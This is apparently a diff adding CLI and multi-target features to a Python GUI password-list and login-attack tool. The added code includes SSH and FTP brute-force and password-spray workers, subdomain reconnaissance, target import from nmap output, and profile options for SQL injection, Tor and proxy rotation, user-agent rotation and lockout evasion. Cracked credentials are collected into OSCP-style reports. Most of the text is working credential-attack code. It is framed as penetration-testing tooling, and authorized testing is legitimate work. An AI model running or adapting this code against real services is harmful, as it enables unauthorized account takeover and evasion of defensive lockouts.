+			# Screenshot
+			self._screenshot_target(self.var_target_url.get().strip(), os.path.join(dirpath, 'screenshot.png'))
+			self._append_preview(f"Evidence bundle saved to {dirpath}")
+		except Exception as exc:
+			messagebox.showerror("Export failed", str(exc))
+
+	def load_profile_from_file(self, path: str) -> None:
+		"""Load a profile JSON from a path (non-interactive)."""
+		try:
+			with open(path, 'r', encoding='utf-8') as f:
+				profile = json.load(f)
+		except Exception as exc:
+			self.ui_queue.put(("log", f"Load failed: {exc}"))
+			return
+		# Assign fields (same mapping as on_load_profile)
+		self.var_name.set(profile.get("name", ""))
+		self.var_surname.set(profile.get("surname", ""))
+		self.var_city.set(profile.get("city", ""))
+		self.var_birthdate.set(profile.get("birthdate", ""))
+		self.var_min_len.set(int(profile.get("min_len", 4)))
+		self.var_max_len.set(int(profile.get("max_len", 6)))
+		self.var_special_chars.set(profile.get("special_chars", "!@#$%_-"))
+		self.var_include_digits.set(bool(profile.get("include_digits", True)))
+		self.var_include_uppercase.set(bool(profile.get("include_uppercase", True)))
+		self.var_mode.set(profile.get("mode", "Brute-force"))
+		self.var_gzip.set(bool(profile.get("gzip", False)))
+		self.var_target_enabled.set(bool(profile.get("target_enabled", False)))
+		self.var_target_url.set(profile.get("target_url", ""))
+		self.var_protocol.set(profile.get("protocol", "HTTP"))
+		self.var_http_method.set(profile.get("http_method", "POST"))
+		self.var_username_value.set(profile.get("username_value", ""))
+		self.var_user_param.set(profile.get("user_param", "username"))
+		self.var_pass_param.set(profile.get("pass_param", "password"))
+		self.var_extra_params.set(profile.get("extra_params", ""))
+		self.var_success_codes.set(profile.get("success_codes", "200,302"))
+		self.var_success_regex.set(profile.get("success_regex", ""))
+		self.var_failure_regex.set(profile.get("failure_regex", ""))
+		self.var_qps.set(float(profile.get("qps", 5.0)))
+		self.var_enable_sqli.set(bool(profile.get("enable_sqli", False)))
+		self.var_sqli_field.set(profile.get("sqli_field", "password"))
+		self.var_concurrency.set(int(profile.get("concurrency", 5)))
+		self.var_headers_json.set(profile.get("headers_json", ""))
+		self.var_cookies.set(profile.get("cookies", ""))
+		self.var_proxy_url.set(profile.get("proxy_url", ""))
+		self.var_verify_tls.set(bool(profile.get("verify_tls", True)))
+		self.var_timeout.set(float(profile.get("timeout", 15.0)))
+		self.var_usernames_file.set(profile.get("usernames_file", ""))
+		self.var_email_domain.set(profile.get("email_domain", ""))
+		self.var_generate_patterns.set(bool(profile.get("generate_patterns", True)))
+		self.var_lowercase_usernames.set(bool(profile.get("lowercase_usernames", True)))
+		self.var_common_aliases.set(bool(profile.get("common_aliases", True)))
+		self.var_spray_enabled.set(bool(profile.get("spray_enabled", False)))
+		self.var_spray_passwords_file.set(profile.get("spray_passwords_file", ""))
+		self.var_spray_cooldown_min.set(float(profile.get("spray_cooldown_min", 15.0)))
+		self.var_spray_window_min.set(float(profile.get("spray_window_min", 60.0)))
+		self.var_spray_attempts_per_window.set(int(profile.get("spray_attempts_per_window", 1)))
+		self.var_spray_stop_on_success.set(bool(profile.get("spray_stop_on_success", True)))
+		self.var_lockout_enabled.set(bool(profile.get("lockout_enabled", True)))
+		self.var_lockout_codes.set(profile.get("lockout_codes", "429,423,403"))
+		self.var_lockout_regex.set(profile.get("lockout_regex", "account locked|too many attempts|temporarily blocked|captcha"))
+		self.var_lockout_cooldown_min.set(float(profile.get("lockout_cooldown_min", 30.0)))
+		self.var_lockout_jitter.set(bool(profile.get("lockout_jitter", True)))
+		self.var_tor_mode.set(bool(profile.get("tor_mode", False)))
+		self.var_tor_proxy.set(profile.get("tor_proxy", "socks5h://127.0.0.1:9050"))
+		self.var_proxy_list_file.set(profile.get("proxy_list_file", ""))
+		self.var_proxy_rotation.set(profile.get("proxy_rotation", "per_request"))
+		self.var_user_agent_rotate.set(bool(profile.get("user_agent_rotate", False)))
+		self.var_user_agent_list_file.set(profile.get("user_agent_list_file", ""))
+		self.var_user_agent_rotation.set(profile.get("user_agent_rotation", "per_request"))
+		self.var_async_engine.set(bool(profile.get("async_engine", False)))
+		self.var_http2.set(bool(profile.get("http2", True)))
+		self.var_max_connections.set(int(profile.get("max_connections", 100)))
+		self.var_retries.set(int(profile.get("retries", 2)))
+		self.var_backoff_ms.set(int(profile.get("backoff_ms", 200)))
+		self.var_checkpoint_enabled.set(bool(profile.get("checkpoint", {}).get("enabled")))
+		self.var_checkpoint_file.set(profile.get("checkpoint", {}).get("file", ""))
+		self.var_resume_from_checkpoint.set(bool(profile.get("checkpoint", {}).get("resume")))
+		self.var_auto_form.set(bool(profile.get("auto_form")))
+		self.var_refresh_csrf.set(bool(profile.get("refresh_csrf")))
+		self.var_prelogin_enabled.set(bool(profile.get("prelogin", {}).get("enabled")))
+		self.var_prelogin_urls.set(
+			", ".join(profile.get("prelogin", {}).get("urls", []))
+		)
+		self.var_prelogin_per_attempt.set(bool(profile.get("prelogin", {}).get("per_attempt")))
+		self.var_prelogin_js.set(bool(profile.get("prelogin", {}).get("headless_js")))
+		self.var_body_mode.set(profile.get("body_mode", "params"))
+		try:
+			self.raw_body_text.delete('1.0', tk.END); self.raw_body_text.insert(tk.END, profile.get("raw_body", ""))
+		except Exception:
+			pass
+		self.var_success_require_redirect.set(bool(profile.get("success_require_redirect", False)))
+		self.var_success_length_gt.set(int(profile.get("success_length_gt", 0)))
+		self.var_safe_mode.set(bool(profile.get("safe_auto_pause")))
+		self.var_allowlist.set(", ".join(profile.get("allowlist", [])) if isinstance(profile.get("allowlist"), list) else profile.get("allowlist", "")
+		)
+		self.var_safe_qps_cap.set(float(profile.get("safe_qps_cap", 1.0)))
+		self.var_safe_concurrency_cap.set(int(profile.get("safe_concurrency_cap", 2)))
+		self.var_safe_auto_pause.set(bool(profile.get("safe_auto_pause")))
+		self.var_flow_enabled.set(bool(profile.get("flow_enabled", False)))
+		self.var_flow_per_attempt.set(bool(profile.get("flow_per_attempt", True)))
+		self.flow_steps = list(profile.get("flow_steps", []))
+		try:
+			self.notes_text.delete('1.0','end'); self.notes_text.insert('1.0', profile.get('notes',''))
+		except Exception:
+			pass
+		self.var_auth_type.set(profile.get('auth_type','None'))
+		self.var_auth_user.set(profile.get('auth_user',''))
+		self.var_auth_pass.set(profile.get('auth_pass',''))
+		self.var_auth_domain.set(profile.get('auth_domain',''))
+		self.var_intruder_enabled.set(bool(profile.get('intruder_enabled', False)))
+		self.var_intruder_mode.set(profile.get('intruder_mode','sniper'))
+		self.var_intruder_markers.set(','.join(profile.get('intruder_markers', [])))
+		self.var_intruder_marker.set(profile.get('intruder_marker','§PAYLOAD§'))
+		self.var_intruder_payloads_file.set(profile.get('intruder_payloads_file',''))
+		self.var_intruder_builtin.set(profile.get('intruder_builtin','none'))
+		try:
+			self.intr_sets_box.delete('1.0', 'end'); self.intr_sets_box.insert('1.0', profile.get('intruder_sets_text',''))
+		except Exception:
+			pass
+		self._info("Profile loaded (CLI)")
+
+	# -------------------- Recon CLI helpers --------------------
+	async def _recon_scan_async(domain: str, subdomains: list[str], concurrency: int = 50, timeout: float = 5.0) -> list[dict]:
+		results: list[dict] = []
+		if httpx is None:
+			return results
+		sem = asyncio.Semaphore(concurrency)
+		async with httpx.AsyncClient(timeout=timeout, verify=False, follow_redirects=True, http2=True) as client:
+			async def check(host: str) -> None:
+				url1 = f"http://{host}"
+				url2 = f"https://{host}"
+				for url in (url2, url1):
+					try:
+						async with sem:
+							r = await client.get(url)
+							results.append({"host": host, "url": str(r.request.url), "status": int(r.status_code), "len": len(r.text)})
+							return
+					except Exception:
+						continue
+				results.append({"host": host, "url": None, "status": None, "len": 0})
+			tasks = [asyncio.create_task(check(f"{s}.{domain}")) for s in subdomains]
+			await asyncio.gather(*tasks, return_exceptions=True)
+		return results
+
+	def run_recon_cli(domain: str, wordlist_path: str, out_dir: str, max_subs: int = 1000) -> None:
+		try:
+			subs: list[str] = []
+			with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
+				for line in f:
+					w = line.strip()
+					if w:
+						subs.append(w)
+			subs = subs[:max_subs]
+		except Exception as exc:
+			print(f"[recon] Failed to read wordlist: {exc}", file=sys.stderr)
+			return
+		print(f"[recon] Scanning {len(subs)} subdomains for {domain}...")
+		alive = asyncio.run(_recon_scan_async(domain, subs))
+		os.makedirs(out_dir, exist_ok=True)
+		alive_only = [r for r in alive if r.get('url')]
+		alive_only.sort(key=lambda x: (x.get('status') or 999, -x.get('len', 0)))
+		with open(os.path.join(out_dir, 'recon_alive.json'), 'w', encoding='utf-8') as f:
+			json.dump(alive_only, f, indent=2)
+		with open(os.path.join(out_dir, 'recon_alive.txt'), 'w', encoding='utf-8') as f:
+			for r in alive_only:
+				f.write(f"{r.get('url')} {r.get('status')} {r.get('len')}\n")
+		print(f"[recon] Alive: {len(alive_only)} -> {os.path.join(out_dir, 'recon_alive.txt')}\n")
+
+	# -------------------- Multi-target orchestration --------------------
+
+	def _parse_targets_file(path: str) -> list[str]:
+		urls: list[str] = []
+		try:
+			with open(path, 'r', encoding='utf-8', errors='ignore') as f:
+				for line in f:
+					w = line.strip()
+					if not w or w.startswith('#'):
+						continue
+					if not w.startswith('http'):
+						w = 'http://' + w
+					urls.append(w)
+		except Exception as exc:
+			print(f"[targets] Failed to read {path}: {exc}", file=sys.stderr)
+		return urls
+
+
+	def _parse_nmap_xml_targets(path: str) -> list[str]:
+		urls: list[str] = []
+		try:
+			tree = ET.parse(path)
+			root = tree.getroot()
+			for host in root.findall('host'):
+				addr = None
+				for a in host.findall('address'):
+					if a.get('addr'):
+						addr = a.get('addr')
+						break
+				if addr is None:
+					continue
+				services: list[tuple[int, str]] = []
+				ports = host.find('ports')
+				if ports is None:
+					continue
+				for p in ports.findall('port'):
+					state = (p.find('state').get('state') if p.find('state') is not None else '')
+					if state != 'open':
+						continue
+					portid = int(p.get('portid') or 0)
+					service = p.find('service')
+					name = (service.get('name') if service is not None else '') or ''
+					services.append((portid, name))
+				# Heuristics: any service containing 'https' -> https; 'http' -> http
+				for portid, name in services:
+					nm = name.lower()
+					if 'http' in nm:
+						scheme = 'https' if ('https' in nm or portid == 443) else 'http'
+						urls.append(f"{scheme}://{addr}:{portid}")
+		except Exception as exc:
+			print(f"[nmap] Failed to parse {path}: {exc}", file=sys.stderr)
+		return urls
+
+
+	def _label_for_target(url: str) -> str:
+		try:
+			u = urlparse(url)
+			host = u.hostname or 'target'
+			port = u.port
+			label = host if not port else f"{host}_{port}"
+			label = re.sub(r"[^A-Za-z0-9_.-]", "_", label)
+			return label
+		except Exception:
+			return "target"
+
+
+	def _replace_target_placeholders(app: 'PasswordListGeneratorApp', url: str) -> None:
+		base_host = (urlparse(url).hostname or '')
+		try:
+			# Replace TARGET in main URL
+			if 'TARGET' in app.var_target_url.get():
+				app.var_target_url.set(app.var_target_url.get().replace('TARGET', base_host))
+			# Replace in flow steps
+			for step in app.flow_steps:
+				u = step.get('url') or ''
+				if 'TARGET' in u:
+					step['url'] = u.replace('TARGET', base_host)
+		except Exception:
+			pass
+
+
+	def _aggregate_md(out_path: str, sections: list[dict]) -> None:
+		try:
+			lines: list[str] = []
+			lines.append("# Multi-target Summary\n")
+			for sec in sections:
+				label = sec.get('label','target')
+				url = sec.get('url','')
+				s = sec.get('snapshot',{})
+				creds = sec.get('credentials',[])
+				lines.append(f"## {label}")
+				lines.append("")
+				lines.append(f"- URL: {url}")
+				for k in ["attempts","successes","failures","lockouts","errors","rps_10s","latency_p50_ms","latency_p95_ms","latency_p99_ms"]:
+					lines.append(f"- {k}: {s.get(k,'')}")
+				if creds:
+					lines.append("")
+					lines.append("| Username | Password | Status | Latency (ms) |")
+					lines.append("|---|---:|---:|---:|")
+					for c in creds:
+						lines.append(f"| {c.get('username','')} | {c.get('password','')} | {c.get('status','')} | {c.get('latency_ms','')} |")
+					lines.append("")
+			with open(out_path, 'w', encoding='utf-8') as f:
+				f.write("\n".join(lines))
+		except Exception as exc:
+			print(f"[aggregate] Failed MD export: {exc}", file=sys.stderr)
+
+
+	def _aggregate_docx(out_path: str, sections: list[dict]) -> None:
+		try:
+			from docx import Document
+			doc = Document()
+			doc.add_heading('Multi-target Summary', 0)
+			for sec in sections:
+				label = sec.get('label','target')
+				url = sec.get('url','')
+				s = sec.get('snapshot',{})
+				creds = sec.get('credentials',[])
+				doc.add_heading(label, level=1)
+				p = doc.add_paragraph(); p.add_run('URL: ').bold = True; p.add_run(url)
+				for k in ["attempts","successes","failures","lockouts","errors","rps_10s","latency_p50_ms","latency_p95_ms","latency_p99_ms"]:
+					doc.add_paragraph(f"{k}: {s.get(k,'')}")
+				if creds:
+					tab = doc.add_table(rows=1, cols=4)
+					hdr = tab.rows[0].cells
+					hdr[0].text='Username'; hdr[1].text='Password'; hdr[2].text='Status'; hdr[3].text='Latency (ms)'
+					for c in creds:
+						row = tab.add_row().cells
+						row[0].text = str(c.get('username',''))
+						row[1].text = str(c.get('password',''))
+						row[2].text = str(c.get('status',''))
+						row[3].text = str(c.get('latency_ms',''))
+			doc.save(out_path)
+		except Exception as exc:
+			print(f"[aggregate] Failed DOCX export: {exc}", file=sys.stderr)
+
+
+	def run_multi_targets_cli(profile_path: str, targets: list[str], base_out_dir: str | None, aggregate_md: str | None, aggregate_docx: str | None, no_gui: bool = True) -> None:
+		sections: list[dict] = []
+		for url in targets:
+			label = _label_for_target(url)
+			out_dir = os.path.join(base_out_dir or os.getcwd(), label)
+			os.makedirs(out_dir, exist_ok=True)
+			app = PasswordListGeneratorApp()
+			try:
+				if no_gui:
+					app.root.withdraw()
+			except Exception:
+				pass
+			app.load_profile_from_file(profile_path)
+			app.var_target_url.set(url)
+			_replace_target_placeholders(app, url)
+			app.on_generate()
+			if app.worker_thread:
+				try:
+					while app.worker_thread.is_alive():
+						app.worker_thread.join(timeout=0.5)
+				except KeyboardInterrupt:
+					app.cancel_requested = True
+					if app.worker_thread:
+						app.worker_thread.join()
+			# Export per-target bundle
+			app.export_evidence_bundle_to_dir(out_dir)
+			sec = {"label": label, "url": url, "snapshot": app._report_snapshot(), "credentials": list(getattr(app, 'found_credentials', []))}
+			sections.append(sec)
+		# Aggregate
+		if aggregate_md:
+			_aggregate_md(aggregate_md, sections)
+		if aggregate_docx:
+			_aggregate_docx(aggregate_docx, sections)
+
+	def _worker_pentest_ssh(self, mode: str, min_len: int, max_len: int, cfg: dict) -> tuple[int, str]:
+		if paramiko is None:
+			return 0, "Missing dependency: install paramiko for SSH spray"
+		completed = 0
+		found_msg = ""
+		limiter = RateLimiter(cfg.get('qps') or 1.0)
+		host = cfg.get('ssh_host') or (urlparse(cfg.get('url') or '').hostname or '')
+		port = int(cfg.get('ssh_port') or 22)
+		stop_event = threading.Event()
+		q = queue.Queue(maxsize=2000)
+		lock = threading.Lock()
+		def producer(it):
+			try:
+				for pair in it:
+					if self.cancel_requested or stop_event.is_set():
+						break
+					try:
+						q.put(pair, timeout=0.5)
+					except queue.Full:
+						continue
+			except Exception as exc:
+				self.ui_queue.put(("log", f"SSH producer error: {exc}"))
+			finally:
+				for _ in range(int(cfg.get('concurrency') or 2)):
+					try:
+						q.put_nowait((None, None))
+					except Exception:
+						pass
+		def attempt(user: str, pwd: str) -> tuple[bool, bool, bool, int]:
+			t0 = time.time()
+			try:
+				client = paramiko.SSHClient()
+				client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+				limiter.acquire()
+				self._wait_global_backoff()
+				client.connect(hostname=host, port=port, username=user, password=pwd, timeout=cfg.get('timeout') or 10.0, allow_agent=False, look_for_keys=False)
+				client.close()
+				lat = int((time.time() - t0) * 1000)
+				return True, False, False, lat
+			except Exception as exc:
+				lat = int((time.time() - t0) * 1000)
+				if SSHAuthException is not None and isinstance(exc, SSHAuthException):
+					return False, False, False, lat
+				return False, False, True, lat
+		def worker(wid: int):
+			nonlocal completed, found_msg
+			while not self.cancel_requested and not stop_event.is_set():
+				try:
+					user, pwd = q.get(timeout=0.5)
+				except queue.Empty:
+					continue
+				if user is None:
+					break
+				ok, locked, error, lat = attempt(user, pwd)
+				self._record_attempt(lat/1000.0, None, ok, locked, error)
+				if self._check_failfast(cfg):
+					stop_event.set(); break
+				with lock:
+					completed += 1
+					if completed <= 50:
+						self.ui_queue.put(("sample", f"TRY {user} : {pwd}"))
+				if ok:
+					found_msg = f"SUCCESS (SSH {host}:{port}): {user} / {pwd}"
+					try:
+						self.found_credentials.append({
+							"timestamp": datetime.now().isoformat(timespec='seconds'),
+							"protocol": "SSH",
+							"host": host,
+							"port": port,
+							"username": user,
+							"password": pwd,
+							"status": "",
+							"latency_ms": lat,
+						})
+					except Exception:
+						pass
+					self.ui_queue.put(("log", found_msg))
+					stop_event.set()
+					break
+		threads = [threading.Thread(target=worker, args=(i,), daemon=True) for i in range(int(cfg.get('concurrency') or 2))]
+		# Build iterable of pairs
+		if cfg.get('spray_enabled'):
+			pairs = ((u, p) for u in (cfg.get('usernames') or []) for p in (cfg.get('spray_passwords') or []))
+		else:
+			fixed_users = cfg.get('usernames', []) or [cfg.get('username')]
+			if mode == 'Brute-force':
+				pw_iter = self._bruteforce_stream(min_len, max_len)
+			elif mode == 'Smart brute-force':
+				pw_iter = self._smart_bruteforce_candidates(min_len, max_len)
+			else:
+				pw_iter = self._smart_candidates(min_len, max_len)
+			pairs = ((fixed_users[0], pw) for pw in pw_iter)
+		prod = threading.Thread(target=producer, args=(pairs,), daemon=True)
+		prod.start()
+		for t in threads:
+			t.start()
+		try:
+			q.join()
+		except Exception:
+			pass
+		stop_event.set()
+		for t in threads:
+			try:
+				t.join(timeout=1.0)
+			except Exception:
+				pass
+		if not found_msg:
+			found_msg = f"SSH run finished. Attempts: {completed:,}. No success."
+		return completed, found_msg
+
+	def _check_failfast(self, cfg: dict) -> bool:
+		if not bool(self.var_failfast_enabled.get()):
+			return False
+		try:
+			window = int(self.var_failfast_window_sec.get() or 60)
+			threshold = float(self.var_failfast_error_pct.get() or 100.0) / 100.0
+			now = time.time()
+			with self.metrics_lock:
+				ats = [t for t in self.metrics["attempt_timestamps"] if now - t <= window]
+				errs = [t for t in self.metrics["error_timestamps"] if now - t <= window]
+				attempts = len(ats)
+				errors = len(errs)
+			if attempts >= 5 and attempts > 0 and (errors / attempts) >= threshold:
+				action = (self.var_failfast_action.get() or 'stop').lower()
+				pct = int((errors/attempts)*100)
+				if action == 'backoff':
+					sec = int(self.var_failfast_backoff_sec.get() or 30)
+					self._trigger_error_backoff(sec)
+					self.ui_queue.put(("log", f"[Fail-fast] Error rate {pct}% over last {window}s; backing off for ~{sec}s"))
+					return False
+				else:
+					self.cancel_requested = True
+					self.ui_queue.put(("log", f"[Fail-fast] Error rate {pct}% over last {window}s; stopping."))
+					return True
+		except Exception:
+			return False
+		return False
+
+	def _trigger_error_backoff(self, seconds: int) -> None:
+		try:
+			with self._error_backoff_lock:
+				self._error_backoff_until[0] = max(self._error_backoff_until[0], time.time() + max(1, int(seconds)))
+		except Exception:
+			pass
+
+	def _wait_global_backoff(self) -> None:
+		try:
+			while not self.cancel_requested:
+				with self._error_backoff_lock:
+					t = self._error_backoff_until[0]
+				now = time.time()
+				if now >= t:
+					return
+				time.sleep(0.2)
+		except Exception:
+			return
+
+	def _worker_pentest_ftp(self, mode: str, min_len: int, max_len: int, cfg: dict) -> tuple[int, str]:
+		completed = 0
+		found_msg = ""
+		limiter = RateLimiter(cfg.get('qps') or 1.0)
+		host = cfg.get('ftp_host') or (urlparse(cfg.get('url') or '').hostname or '')
+		port = int(cfg.get('ftp_port') or 21)
+		tls = bool(cfg.get('ftp_tls'))
+		passive = bool(cfg.get('ftp_passive', True))
+		stop_event = threading.Event()
+		q = queue.Queue(maxsize=2000)
+		lock = threading.Lock()
+		def producer(it):
+			try:
+				for pair in it:
+					if self.cancel_requested or stop_event.is_set():
+						break
+					try:
+						q.put(pair, timeout=0.5)
+					except queue.Full:
+						continue
+			except Exception as exc:
+				self.ui_queue.put(("log", f"FTP producer error: {exc}"))
+			finally:
+				for _ in range(int(cfg.get('concurrency') or 2)):
+					try:
+						q.put_nowait((None, None))
+					except Exception:
+						pass
+		def attempt(user: str, pwd: str) -> tuple[bool, bool, bool, int, str]:
+			t0 = time.time(); code = ''
+			try:
+				ftp = ftplib.FTP_TLS() if tls else ftplib.FTP()
+				limiter.acquire(); self._wait_global_backoff()
+				ftp.connect(host=host, port=port, timeout=cfg.get('timeout') or 10.0)
+				ftp.set_pasv(passive)
+				if tls and isinstance(ftp, ftplib.FTP_TLS):
+					try: ftp.auth()
+					except Exception: pass
+				resp = ftp.login(user=user, passwd=pwd)
+				code = (resp or '')[:3]
+				try:
+					ftp.quit()
+				except Exception:
+					try: ftp.close()
+					except Exception: pass
+				lat = int((time.time() - t0) * 1000)
+				if code == '230':
+					return True, False, False, lat, code
+				elif code == '530':
+					return False, False, False, lat, code
+				else:
+					return False, False, True, lat, code
+			except ftplib.error_temp as exc:
+				lat = int((time.time() - t0) * 1000)
+				msg = str(exc)
+				if '421' in msg:
+					self._trigger_error_backoff(int(self.var_failfast_backoff_sec.get() or 30))
+					self.ui_queue.put(("log", f"[FTP] 421 backoff triggered"))
+					return False, True, True, lat, '421'
+				return False, False, True, lat, '4xx'
+			except ftplib.error_perm as exc:
+				lat = int((time.time() - t0) * 1000)
+				msg = str(exc)
+				if msg.startswith('530'):
+					return False, False, False, lat, '530'
+				return False, False, True, lat, '5xx'
+			except Exception:
+				lat = int((time.time() - t0) * 1000)
+				return False, False, True, lat, code or ''
+		def worker(wid: int):
+			nonlocal completed, found_msg
+			while not self.cancel_requested and not stop_event.is_set():
+				try:
+					user, pwd = q.get(timeout=0.5)
+				except queue.Empty:
+					continue
+				if user is None:
+					break
+				ok, locked, error, lat, code = attempt(user, pwd)
+				self._record_attempt(lat/1000.0, None, ok, locked, error)
+				if self._check_failfast(cfg):
+					stop_event.set(); break
+				if self._log_fp:
+					self._log_line([
+						datetime.now().isoformat(timespec='seconds'), user, pwd, code, lat, int(bool(ok)), int(bool(locked)), int(bool(error)), '', ''
+					])
+				with lock:
+					completed += 1
+					if completed <= 50:
+						self.ui_queue.put(("sample", f"TRY {user} : {pwd}"))
+				if ok:
+					found_msg = f"SUCCESS (FTP{'+TLS' if tls else ''} {host}:{port}): {user} / {pwd}"
+					try:
+						self.found_credentials.append({
+							"timestamp": datetime.now().isoformat(timespec='seconds'),
+							"protocol": "FTPS" if tls else "FTP",
+							"host": host,
+							"port": port,
+							"username": user,
+							"password": pwd,
+							"status": code,
+							"latency_ms": lat,
+						})
+					except Exception:
+						pass
+					self.ui_queue.put(("log", found_msg))
+					stop_event.set(); break
+		threads = [threading.Thread(target=worker, args=(i,), daemon=True) for i in range(int(cfg.get('concurrency') or 2))]
+		# Build iterable of pairs
+		if cfg.get('spray_enabled'):
+			pairs = ((u, p) for u in (cfg.get('usernames') or []) for p in (cfg.get('spray_passwords') or []))
+		else:
+			fixed_users = cfg.get('usernames', []) or [cfg.get('username')]
+			if mode == 'Brute-force':
+				pw_iter = self._bruteforce_stream(min_len, max_len)
+			elif mode == 'Smart brute-force':
+				pw_iter = self._smart_bruteforce_candidates(min_len, max_len)
+			else:
+				pw_iter = self._smart_candidates(min_len, max_len)
+			pairs = ((fixed_users[0], pw) for pw in pw_iter)
+		prod = threading.Thread(target=producer, args=(pairs,), daemon=True)
+		prod.start()
+		for t in threads:
+			t.start()
+		try:
+			q.join()
+		except Exception:
+			pass
+		stop_event.set()
+		for t in threads:
+			try:
+				t.join(timeout=1.0)
+			except Exception:
+				pass
+		if not found_msg:
+			found_msg = f"FTP run finished. Attempts: {completed:,}. No success."
+		return completed, found_msg
+
 
 if __name__ == "__main__":
+	parser = argparse.ArgumentParser(add_help=True)
+	parser.add_argument('--profile', dest='cli_profile', help='Run in CLI mode with the given profile JSON')
+	parser.add_argument('--out-dir', dest='out_dir', help='Output directory (evidence bundle, recon output)')
+	parser.add_argument('--bundle-dir', dest='bundle_dir', help='Evidence bundle output directory (defaults to --out-dir)')
+	parser.add_argument('--report-md', dest='report_md', help='Path to write OSCP Markdown report')
+	parser.add_argument('--report-docx', dest='report_docx', help='Path to write OSCP DOCX report')
+	parser.add_argument('--docx-template', dest='docx_template', help='Path to a DOCX template (or set DOCX_TEMPLATE env)')
+	parser.add_argument('--aggregate-md', dest='agg_md', help='Path to write aggregated Markdown for multi-target runs')
+	parser.add_argument('--aggregate-docx', dest='agg_docx', help='Path to write aggregated DOCX for multi-target runs')
+	parser.add_argument('--targets-file', dest='targets_file', help='Text file with one host/URL per line')
+	parser.add_argument('--nmap-xml', dest='nmap_xml', help='Nmap -oX output to extract HTTP targets')
+	parser.add_argument('--recon', dest='recon_domain', help='Run subdomain recon for a domain (e.g., example.com)')
+	parser.add_argument('--wordlist', dest='wordlist', help='Wordlist for subdomains (default: wordlist.txt in repo)')
+	parser.add_argument('--max-subs', dest='max_subs', type=int, default=1000, help='Max subdomains to scan from wordlist')
+	parser.add_argument('--no-gui', dest='no_gui', action='store_true', help='Try to hide the GUI window (withdraw)')
+	args, _ = parser.parse_known_args()
+	# CLI branches
+	if args.cli_profile or args.recon_domain or args.targets_file or args.nmap_xml:
+		# Recon first if requested
+		if args.recon_domain:
+			wl = args.wordlist or os.path.join(os.path.dirname(__file__), 'wordlist.txt')
+			out_dir = args.out_dir or os.getcwd()
+			run_recon_cli(args.recon_domain, wl, out_dir, max_subs=int(args.max_subs or 1000))
+		# Multi-target orchestration
+		if args.cli_profile and (args.targets_file or args.nmap_xml):
+			targets: list[str] = []
+			if args.targets_file:
+				targets.extend(_parse_targets_file(args.targets_file))
+			if args.nmap_xml:
+				targets.extend(_parse_nmap_xml_targets(args.nmap_xml))
+			targets = [t for t in targets if t]
+			if not targets:
+				print("[multi] No targets found", file=sys.stderr)
+				sys.exit(1)
+			# Apply docx template flag if provided
+			if args.docx_template:
+				os.environ['DOCX_TEMPLATE'] = args.docx_template
+			run_multi_targets_cli(args.cli_profile, targets, args.out_dir or os.getcwd(), args.agg_md, args.agg_docx, no_gui=bool(args.no_gui))
+			sys.exit(0)
+		# Single profile-driven CLI
+		if args.cli_profile:
+			app = PasswordListGeneratorApp()
+			try:
+				if args.no_gui:
+					app.root.withdraw()
+			except Exception:
+				pass
+			if args.docx_template:
+				app.var_docx_template_path.set(args.docx_template)
+			app.load_profile_from_file(args.cli_profile)
+			app.on_generate()
+			if app.worker_thread:
+				try:
+					while app.worker_thread.is_alive():
+						app.worker_thread.join(timeout=0.5)
+				except KeyboardInterrupt:
+					app.cancel_requested = True
+					if app.worker_thread:
+						app.worker_thread.join()
+			bundle_dir = args.bundle_dir or args.out_dir
+			if bundle_dir:
+				os.makedirs(bundle_dir, exist_ok=True)
+				app.export_evidence_bundle_to_dir(bundle_dir)
+			if args.report_md:
+				app.export_oscp_markdown_to(args.report_md)
+			if args.report_docx:
+				app.export_oscp_docx_to(args.report_docx)
+			sys.exit(0)
+	# GUI mode
 	app = PasswordListGeneratorApp()
 	app.run()
